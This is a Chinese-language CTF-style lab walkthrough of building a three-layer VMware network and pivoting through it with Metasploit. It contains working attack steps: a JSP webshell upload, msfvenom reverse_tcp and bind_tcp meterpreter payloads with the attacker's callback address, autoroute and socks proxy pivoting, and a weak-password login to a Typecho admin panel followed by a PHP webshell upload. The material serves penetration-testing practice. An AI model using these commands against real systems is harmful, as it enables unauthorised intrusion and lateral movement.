# 三层网络靶场搭建&MSF内网渗透

在最近的CTF比赛中，综合靶场出现的次数越来越多，这种形式的靶场和真实的内网渗透很像，很贴合实际工作，但我们往往缺少多层网络的练习环境。本文通过VMware搭建3层网络，并通过msf进行内网渗透，涉及代理搭建，流量转发，端口映射等常见内网渗透技术。

## **第一层靶机**

Nmap探测一下，发现8080端口：

![](../Images/6558a910c39706240b69825fb3172e00.png)

**访问一下：**

![](../Images/3b9c685858a0ea546b41cbd18758217e.png)

**返现文件上传点，经测试没有任何过滤，可以直接上传任意文件，因此直接上传jsp一句话后门：**

![](../Images/4e947998aa913226d05f6e78cca5b99e.png)

**上传后返回文件路径，菜刀连接：**

![](../Images/e96dc10c88cf9d0d6de01e292a3049cf.png)

**为了进一步做内网渗透，上传msf后门：**

**1、后门制作：**

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.59.128 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf >shell.elf`

将shell.elf上传到第一层靶机192.168.59.129

**2、MSF设置监听：**

![](../Images/a91b9b52fa1d0278b371ab863567f81f.png)

**3、在第一层靶机运行shell.elf**

**`Chmod 777 shell.elf`  
`./shell.elf`**

**4、Msf获得meterpreter，执行shell，查看网络配置，发现双网卡，第二层网络段为192.168.80.0/24**

![](../Images/0806ba029996f0be963f390fc5f058be.png)

## **第二层靶机**

首先利用第一层的meterpreter添加到第二层的路由：

`run autoroute -s 192.168.80.0/24`

![](../Images/1c425cbd03cc57ff69cb93fb5092d7d0.png)

**然后利用msf进行第二层网络存活主机扫描：**

**`use auxiliary/scanner/discovery/arp_sweep`**

![](../Images/c29877582f3aeed144ac8ed476102e1f.png)

**发现第二层靶机 192.168.80.129。**

**接着利用msf搭建socks代理，好让攻击机直接打第二层网络：**

**`use auxiliary/server/socks4a`**

![](../Images/11120a0657480ef32910e0df33088449.png)

**然后在第一层网络配置相关socks4代理客户端：**

**Proxychain:**

**在配置文件/etc/proxychains.conf中添加：**

**socks4 192.168.59.128 9999**

**然后利用proxychans 启动nmap对第二层靶机进行扫描，这里注意一定要加上-Pn和-sT参数：**

**`proxychains nmap -Pn -sT 192.168.80.129 -p1-1000`**

![](../Images/a2b42f141ee2415a0c0cbffb3dab0a2b.png)

**发现第二层主机开放22和80端口。**

**在Chrome中配置代理**

![](../Images/fbf31eed14682dc65b5f7f954aa04c67.png)

**访问第二层网络：**

![](../Images/ae37f1307d3c88dd1e1f41d5c9af3714.png)

**是一个typecho的 cms，尝试admin/admin等弱口令登陆后台，登陆成功：**

![](../Images/e54ad545ad78f6b7958a9851fcd11b9b.png)

**个人信息处发现flag：**

**然后撰写文章，附件上传php webshell：**

![](../Images/b76df60e9b4c4ec41d5ef0143f5ca847.png)

**可以看到shell路径，用蚁剑连接，因为是第二层网络，所以得通过socks代理客户端去启动蚁剑，我用的是sockscap64：**

![](../Images/f69204c6131a54a1e0f436872c5a0f2d.png)

**在代理中配置代理服务器：**

![](../Images/6f3cc442a9175b931facd7b86bb9de80.png)

**Hydra：**

**同样，为了打进第三层，我们需要在第二层靶机上上传msf后门，**

**制作后门：**

**`msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4321 -f elf > shell1.elf`**

**利用蚁剑上传，并在第二层靶机运行：**

**`Chmod 777 ./shell1.elf`  
`./shell1.elf`**

**在msf上配置payload：**

![](../Images/67e941366d6d65c498e5b3d52b2e5126.png)

**发现第三层网段192.168.226.0/24**

![](../Images/182937ee69dc5cb95f11bf6e310d8bc1.png)

**然后利用这个meterpreter添加到第三层的网络路由：**

**`run autoroute -s 192.168.226.0/24`**

![](../Images/072abcdac0d5ce73b0de43cd6d6819b4.png)

**在启用一个socks代理给第三层网络，端口开9998**

![](../Images/494607ed941ca682d951a71fe386819f.png)

**然后在proxychains的配置文件中加上9998：**

![](../Images/d5959b9b5b514c076d07b3d7a46f25bb.png)

**扫描一下第三层主机端口：**

**`proxychains nmap -Pn -sT 192.168.226.129 -p1-1000`**

![](../Images/f5edf5f17b191b8876b3794c75a52ae4.png)

**发现开放了80、445端口**
